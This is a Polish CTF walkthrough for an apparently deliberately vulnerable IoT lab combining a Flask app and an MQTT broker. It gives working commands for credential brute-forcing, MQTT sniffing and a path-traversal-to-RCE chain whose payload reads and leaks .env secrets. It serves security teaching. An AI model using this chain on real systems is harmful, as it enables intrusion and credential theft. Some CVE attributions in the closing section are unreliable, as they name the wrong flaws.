# EnviroSense CTF — Pełny przepływ ataków

> Dla każdego ataku: **co robisz → skąd wiesz → dlaczego działa → gdzie jest luka w kodzie**

---

## Architektura systemu

```
[ESP8266 / symulator]
        │
        │ MQTT publish (port 1883)
        ▼
[Mosquitto broker]
        │
        │ MQTT subscribe
        ▼
[mqtt_receiver.py] ──── zapisuje do ────► [SQLite temperature.db]
        │                                         │
        │ OTA upload                              │ SELECT
        ▼                                         ▼
[firmware/]                              [Flask app.py port 6007]
        │                                         │
        │ GET /firmware/<plik>                    │ HTTP
        ▼                                         ▼
[atakujący pobiera]                      [przeglądarka / curl]
```

---

## Etap 0 — Punkt startowy

Wiesz tylko:
```
IP: 192.168.137.130
```

---

## Etap 1 — Recon sieciowy

### Co robisz

```bash
nmap -sV -p- --min-rate=1000 192.168.137.130
```

### Wynik

```
1883/tcp open  mosquitto Eclipse Mosquitto 2.x
6007/tcp open  http      Werkzeug/3.0.1 Python/3.12
```

### Skąd wiesz że to ważne

- Port `1883` = MQTT. Standardowy port, jak `80` dla HTTP. Każdy kto zna IoT wie co to znaczy.
- `Werkzeug` w bannerze = Flask w trybie deweloperskim. Werkzeug to serwer deweloperski Flaska — **nigdy** nie powinien być widoczny na produkcji.

### Gdzie jest luka

Nigdzie konkretnie — to tylko recon. Ale `Werkzeug` w bannerze mówi atakującemu:
- Aplikacja działa w trybie `debug=True`
- Może być dostępny `/console`
- Błędy będą pokazywać pełne stack trace ze ścieżkami plików

---

## Etap 2 — Mapowanie aplikacji webowej

### Co robisz

```bash
# Endpointy z frontendu (JS wywołuje je przez fetch())
curl -s http://192.168.137.130:6007/ | grep -oE '"/api/[^"]*"'

# Ukryte endpointy przez gobuster
gobuster dir -u http://192.168.137.130:6007/ \
  -w /tmp/seclists-common.txt -t 30 -b 404

gobuster dir -u http://192.168.137.130:6007/api/ \
  -w /tmp/seclists-common.txt -t 30 -b 404

gobuster dir -u http://192.168.137.130:6007/api/admin/ \
  -w /tmp/seclists-common.txt -t 30 -b 404
```

### Wynik

```
Z frontendu:
  /api/login, /api/register, /api/logout
  /api/stats, /api/readings, /api/me

Z gobuster /:
  /console   (200) ← Werkzeug debugger
  /firmware  (200) ← listing plików OTA

Z gobuster /api/:
  /api/info  (200) ← brak auth, ciekawe
  /api/admin (401) ← wymaga auth
  /api/me    (401)
  /api/stats (401)
  /api/login (405) ← POST only
  /api/register (405) ← POST only

Z gobuster /api/admin/:
  /api/admin/secret (401) ← wymaga auth admina
  /api/admin/users  (401)
```

### Skąd wiesz co jest ważne

- `/console` → Werkzeug debugger, potencjalny RCE jeśli zgadniesz PIN
- `/firmware` → serwuje pliki, coś związanego z OTA dla ESP8266
- `/api/info` → nie wymaga auth, prawdopodobnie info leak
- `/api/admin/secret` → ukryta flaga za autoryzacją admina

### Gdzie jest luka

`debug=True` w `app.py`:
```python
app.run(host="0.0.0.0", port=6007, debug=True, use_reloader=True)
```

Werkzeug w trybie debug udostępnia `/console` i pokazuje pełne stack trace. To **krytyczny błąd** — zostawienie `debug=True` na produkcji.

---

## FLAGA 1 — Default credentials admina

**Trudność:** 🟢 łatwa

### Co robisz

Widzisz że jest panel admina. Próbujesz domyślnych haseł:

```bash
for p in admin admin123 password 123456 root; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://192.168.137.130:6007/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$p\"}")
  echo "admin:$p → $CODE"
done
```

Wynik:
```
admin:admin → 401
admin:admin123 → 200   ← TRAFIONE
admin:password → 401
```

Pobierasz token i wywołujesz:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://192.168.137.130:6007/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl http://192.168.137.130:6007/api/admin/secret \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

```json
{"flag": "FLAG{weak_admin_password_pwned}", "message": "Welcome admin"}
```

### Skąd wiesz że spróbować `admin123`

`admin123` jest w każdej wordliście default credentials dla IoT i webaplikacji. To **standardowy pierwszy krok** każdego pentesta.

### Gdzie jest luka w kodzie

`app.py`, funkcja `create_db()`:

```python
admin_hash = generate_password_hash("admin123")   # ← hardkodowane hasło
conn.execute("""
    INSERT OR IGNORE INTO users (username, password_hash, role)
    VALUES (?, ?, ?)
""", ("admin", admin_hash, "admin"))
```

Aplikacja tworzy konto admina z hardkodowanym hasłem przy pierwszym starcie. Programista myślał "zmienię przed produkcją" — i zapomniał. Klasyczny błąd.

### Jak rozpoznać tę podatność

- Aplikacja ma panel logowania
- Domyślne hasła nie zostały zmienione
- W kodzie/konfiguracji widać hardkodowane credentials

---

## FLAGA 2 — Ukryty endpoint z information disclosure

**Trudność:** 🟡 średnia

### Co robisz

Gobuster znalazł `/api/info`. Odpytujesz:

```bash
curl -s http://192.168.137.130:6007/api/info | python3 -m json.tool
```

Wynik:
```json
{
    "status": "ok",
    "version": "1.2.0",
    "sensor_count": 1,
    "plugins_loaded": ["hello.py"],
    "debug": {
        "monitoring": "enabled",
        "support_token": "FLAG{public_status_endpoint_leak}"
    }
}
```

### Skąd wiesz że tam szukać

Gobuster próbuje każde słowo z wordlisty. `info` jest w SecLists → gobuster sprawdza `/api/info` → serwer zwraca 200 → gobuster to raportuje. Atakujący nie zgaduje — narzędzie robi to za niego.

### Gdzie jest luka w kodzie

`app.py`, endpoint `/api/info`:

```python
@app.route("/api/info")
def status():
    plugins = [f for f in os.listdir(PLUGINS_DIR) if f.endswith(".py")]
    return jsonify({
        "status": "ok",
        "version": "1.2.0",
        "plugins_loaded": plugins,   # ← zdradza strukturę projektu
        "debug": {
            "support_token": "FLAG{...}"   # ← flaga bez auth
        }
    })
```

Dwie rzeczy są złe:
1. Endpoint nie wymaga autoryzacji (`@require_auth` brakuje)
2. Zwraca informacje wewnętrzne (`plugins_loaded`, wersja, flaga)

### Bonus z tego endpointu

`"plugins_loaded": ["hello.py"]` → wiesz że istnieje katalog `plugins/` z plikami `.py`. To **breadcrumb** do Flagi 4.

### Jak rozpoznać tę podatność

- Endpoint bez autoryzacji zwracający dane wewnętrzne
- Health-check / status / debug endpoint udostępniony publicznie
- Brak `@require_auth` na endpointach które powinny być chronione

---

## FLAGA 3 — MQTT sniffing + base64 decode

**Trudność:** 🟡 średnia

### Co robisz

**Krok 1:** Sprawdź czy MQTT wymaga auth:

```bash
mosquitto_sub -h 192.168.137.130 -t '#' -v
# → Connection Refused: not authorised
```

**Krok 2:** Brute force credentials:

```bash
for cred in "admin:admin" "mqtt:mqtt" "iot:iot" \
            "iot_device:iot2024" "esp8266:esp8266"; do
  u="${cred%:*}"
  p="${cred#*:}"
  result=$(timeout 3 mosquitto_sub -h 192.168.137.130 \
    -u "$u" -P "$p" -t '$SYS/broker/version' -C 1 2>&1)
  if [[ "$result" != *"Refused"* ]] && [[ -n "$result" ]]; then
    echo "[+] FOUND: $u:$p"
  fi
done
```

Wynik: `[+] FOUND: iot_device:iot2024`

**Krok 3:** Subskrybuj wszystkie topiki:

```bash
mosquitto_sub -h 192.168.137.130 -u iot_device -P iot2024 -t '#' -v
```

Widzisz:
```
esp8266/dht11 {"sensor_id":6,"temperature":22.4,"humidity":55.1,"diag":"RkxBR3ttcXR0X3NlbnNvcl9wYXlsb2FkX2xlYWt9"}
```

Pole `diag` wygląda jak base64. Dekokujesz:

```bash
echo "RkxBR3ttcXR0X3NlbnNvcl9wYXlsb2FkX2xlYWt9" | base64 -d
# → FLAG{mqtt_sensor_payload_leak}
```

### Skąd wiesz że spróbować brute force MQTT

MQTT bez auth to **bardzo częsty błąd** w projektach IoT. Każdy pentester sprawdza to automatycznie po znalezieniu portu 1883.

### Skąd wiesz że dekodować base64

`diag` nie wygląda jak temperatura ani wilgotność. Długi string z `=` na końcu → typowy base64. To **standardowy pattern** w CTF i realnych pentestach — podejrzane stringi sprawdza się przez `base64 -d`.

### Gdzie jest luka w kodzie

`sensor_simulator.py`:

```python
import base64
FLAG = base64.b64encode(b"FLAG{mqtt_sensor_payload_leak}").decode()

payload = {
    "sensor_id": SENSOR_ID,
    "temperature": round(temp, 1),
    "humidity": round(hum, 1),
    "diag": FLAG   # ← zakodowana flaga w każdym payloadzie
}
```

`mqtt_receiver.py` i mosquitto:

```python
MQTT_PASS = os.environ.get("MQTT_PASS", "iot2024")   # ← słabe hasło
```

```conf
allow_anonymous false   # ← jest auth
# ale brak ACL — każdy zalogowany subskrybuje wszystko
```

### Jak rozpoznać te podatności

- Słabe/domyślne hasła MQTT (sprawdzaj zawsze)
- Brak ACL → `mosquitto_sub -t '#'` pokazuje wszystko po zalogowaniu
- Podejrzane pola w payloadach → sprawdź base64, hex, rot13

---

## FLAGA 4 — MQTT OTA → Path traversal → Plugin loader → RCE

**Trudność:** 🔴 trudna (chain 5 kroków)

### Krok 4.1 — Odkryj topic OTA

Z Etapu MQTT sniffing widziałeś:

```
esp8266/status/sensor6 {"ota_topic": "esp8266/ota", "firmware": "v1.2", ...}
```

Sensor sam zdradza że istnieje topic do uploadu firmware.

**Skąd wiesz:** retained message (`retain=True`) — broker zachowuje ją i wysyła każdemu nowemu subskrybentowi od razu po połączeniu.

### Krok 4.2 — Potwierdź write primitive

```bash
mosquitto_pub -h 192.168.137.130 -u iot_device -P iot2024 \
  -t esp8266/ota \
  -m '{"name":"test.bin","data":"SEVMTE8="}'

curl http://192.168.137.130:6007/firmware/test.bin
# → HELLO
```

**Skąd wiesz że plik trafi do /firmware/:** z gobustera wiesz że `/firmware` istnieje i listuje pliki. Logiczny wniosek: OTA zapisuje do tego katalogu.

**Dlaczego to działa** — `mqtt_receiver.py`:

```python
def handle_ota(payload):
    msg = json.loads(payload)
    name = msg["name"]                         # ← brak walidacji
    blob = base64.b64decode(msg["data"])
    path = os.path.join(FIRMWARE_DIR, name)    # ← os.path.join nie filtruje ..
    with open(path, "wb") as f:
        f.write(blob)
```

Brak sprawdzenia:
- Kto wysyła (każdy z dostępem do MQTT)
- Co wysyła (dowolna nazwa, dowolna zawartość)
- Dokąd trafia (ścieżka nie jest sanityzowana)

### Krok 4.3 — Path traversal poza firmware/

Testujesz `..` w nazwie — standardowy test gdy aplikacja przyjmuje nazwę pliku od użytkownika:

```bash
mosquitto_pub -h 192.168.137.130 -u iot_device -P iot2024 \
  -t esp8266/ota \
  -m '{"name":"../canary.txt","data":"Q0FOQVJZ"}'
```

Plik ląduje w `/home/.../envirosense/canary.txt` zamiast `firmware/canary.txt`.

**Dlaczego `os.path.join` nie chroni:**

```python
>>> os.path.join("/projekt/firmware", "../plugins/hello.py")
'/projekt/firmware/../plugins/hello.py'
# system plików: .. = katalog wyżej → /projekt/plugins/hello.py
```

`os.path.join` to tylko sklejanie stringów. System plików interpretuje `..` dosłownie.

### Krok 4.4 — Znajdź gdzie wgrać plik .py żeby się wykonał

Z `/api/info` wiesz że jest `plugins/hello.py`. Z stack trace (wywołanego przez `?limit=abc`) wiesz ścieżkę projektu.

**Breadcrumb chain:**
```
/api/info → "plugins_loaded": ["hello.py"] → wiesz że jest katalog plugins/
stack trace → /home/envirosense_ctf/envirosense/app.py → wiesz pełną ścieżkę
```

Wiesz że `load_plugins()` w `app.py` **wykonuje każdy .py** z katalogu `plugins/`:

```python
def load_plugins():
    for filename in os.listdir(PLUGINS_DIR):
        if not filename.endswith(".py"):
            continue
        spec = importlib.util.spec_from_file_location(filename[:-3], path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)   # ← WYKONUJE KOD
```

### Krok 4.5 — RCE przez nadpisanie hello.py

Tworzysz payload:

```bash
cat > /tmp/exploit.py << 'EOF'
import os, subprocess

here = os.path.dirname(os.path.abspath(__file__))
parent = os.path.dirname(here)

out = subprocess.run(
    ["sh", "-c", f"ls -la '{parent}' && echo '=== .env ===' && cat '{parent}/.env'"],
    capture_output=True, text=True
).stdout

with open(os.path.join(parent, "firmware", "leak.txt"), "w") as f:
    f.write(out)
EOF

PAYLOAD=$(base64 -w0 /tmp/exploit.py)

# Nadpisz istniejący hello.py (nie nowy plik!)
mosquitto_pub -h 192.168.137.130 -u iot_device -P iot2024 \
  -t esp8266/ota \
  -m "{\"name\":\"../plugins/hello.py\",\"data\":\"$PAYLOAD\"}"
```

**Dlaczego nadpisać `hello.py` a nie wgrać nowy plik:**

Flask reloader obserwuje tylko pliki które były zaimportowane przy starcie. `hello.py` był załadowany → jest na liście → modyfikacja triggeruje reload.

Nowy plik `pwn.py` nie był importowany → reloader go nie widzi → brak restartu → brak wykonania.

### Krok 4.6 — Pobierz wynik

```bash
sleep 5   # poczekaj na Flask reload (2-3 sekundy)
curl http://192.168.137.130:6007/firmware/leak.txt
```

Wynik:
```
total 184
drwxr-xr-x 8 root root  4096 ...
-rw-r--r-- 1 root root   208 ... .env
-rw-r--r-- 1 root root 10975 ... app.py
...

=== .env ===
DB_PATH=./temperature.db
MQTT_USER=iot_device
MQTT_PASS=iot2024
FLASK_SECRET_KEY=please-change-me-in-production
ADMIN_RECOVERY_KEY=FLAG{ota_path_traversal_to_rce_chain}
```

### Dlaczego wynik jest w firmware/

Twój payload zapisuje wynik do `firmware/leak.txt`. Flask serwuje ten katalog przez HTTP. `firmware/` jest **kanałem zwrotnym** — piszesz tam wynik, pobierasz przez curl.

---

## Mapa całego ataku

```
nmap
  ├─► port 6007 (Flask)
  │       │
  │       ├─► gobuster / → /console + /firmware
  │       ├─► gobuster /api/ → /api/info + /api/admin + reszta
  │       ├─► gobuster /api/admin/ → /secret + /users
  │       │
  │       ├─► /api/info → FLAG 2 + hint o plugins/
  │       │
  │       └─► admin/admin123 → token → /api/admin/secret → FLAG 1
  │
  └─► port 1883 (MQTT)
          │
          ├─► brute force → iot_device:iot2024
          │
          ├─► mosquitto_sub '#' → diag (base64) → FLAG 3
          │                    → hint o esp8266/ota
          │
          ├─► OTA upload test → write w firmware/
          │
          ├─► path traversal ../plugins/ → write-anywhere
          │
          ├─► nadpisanie hello.py → Flask reload → load_plugins()
          │
          └─► RCE → cat .env → FLAG 4
```

---

## Tabela podatności

| # | Podatność | Gdzie w kodzie | Jak zauważyć | Klasa |
|---|-----------|----------------|--------------|-------|
| 1 | Hardkodowane hasło admina | `app.py → create_db()` | Próbuj default creds po znalezieniu logowania | CWE-798 |
| 2 | Endpoint bez auth z flagą | `app.py → /api/info` | Gobuster + brak `@require_auth` | CWE-862 |
| 3 | Słabe hasło MQTT | `mqtt_receiver.py → MQTT_PASS` | Brute force default IoT creds | CWE-521 |
| 4 | Brak ACL na brokerze | konfiguracja mosquitto | `mosquitto_sub -t '#'` po zalogowaniu | CWE-284 |
| 5 | Flaga w payloadzie MQTT | `sensor_simulator.py` | Subskrybuj i szukaj podejrzanych pól | CWE-200 |
| 6 | Brak walidacji nazwy pliku OTA | `mqtt_receiver.py → handle_ota()` | Wgrywaj z `..` w nazwie | CWE-22 |
| 7 | `debug=True` na produkcji | `app.py → app.run()` | Werkzeug w bannerze, `/console`, stack trace | CWE-215 |
| 8 | Plugin auto-loader bez whitelist | `app.py → load_plugins()` | `plugins_loaded` w `/api/info` | CWE-434 |

---

## Jak rozpoznawać podatności w praktyce

### Sygnały że warto brute force credentials

- Panel logowania istnieje
- Aplikacja IoT / embedded / hobby project
- Banner serwera ujawnia że to dev/debug setup
- Port 1883 (MQTT) bez TLS

### Sygnały że warto gobusterować

- Aplikacja ma API pod `/api/`
- Skanuj root + każdy znaleziony prefix osobno
- Używaj SecLists big.txt dla lepszego pokrycia
- Sprawdzaj GET i POST osobno (`-m POST`)

### Sygnały path traversal

- Endpoint przyjmuje nazwę pliku od użytkownika
- Widzisz `name`, `filename`, `path`, `file` w payloadzie/URL
- Aplikacja zapisuje plik i serwuje go przez HTTP
- Zawsze testuj `../` w tych parametrach

### Sygnały że jest auto-loader

- `/api/info` pokazuje `plugins_loaded`
- Stack trace zawiera ścieżki do `plugins/` lub `extensions/`
- Komentarze w JS/HTML wspominają o pluginach
- Aplikacja Flask/Django z katalogiem `plugins/`

### Sygnały information disclosure

- Endpoint bez auth zwraca więcej niż powinien
- Pola `debug`, `internal`, `token`, `key` w JSON
- Stack trace z pełnymi ścieżkami
- `X-Debug`, `X-Powered-By` w headerach

---

## Dlaczego każda podatność jest realistyczna

Każdy błąd w tej apce to **prawdziwy wzorzec** z realnych incydentów:

**Hardkodowane hasło:** Mirai botnet (2016) zainfekował 600,000 urządzeń IoT przez `admin/admin`, `root/root` i podobne. To nadal #1 wektor w IoT.

**Weak MQTT:** Shodan pokazuje dziesiątki tysięcy otwartych brokerów MQTT w internecie bez auth lub z domyślnymi hasłami.

**Path traversal w `os.path.join`:** CVE-2018-20060 (requests), CVE-2022-24439 (gitpython), regularnie pojawiające się CVE w projektach Pythonowych.

**`debug=True` na produkcji:** Patreon zhackowany w 2015 dokładnie przez otwarty Werkzeug debugger (`/console`). Shodan pokazuje tysiące takich serwerów dziś.

**Plugin auto-loader:** WordPress, Joomla, Jenkins — wszystkie mają historię CVE w systemach pluginów. Wzorzec "wgraj plik → zostanie wykonany" jest wszędzie.

Żadna z tych podatności nie jest wymyślona na potrzeby CTF. Projekt pokazuje je wszystkie razem w skondensowanej formie edukacyjnej.
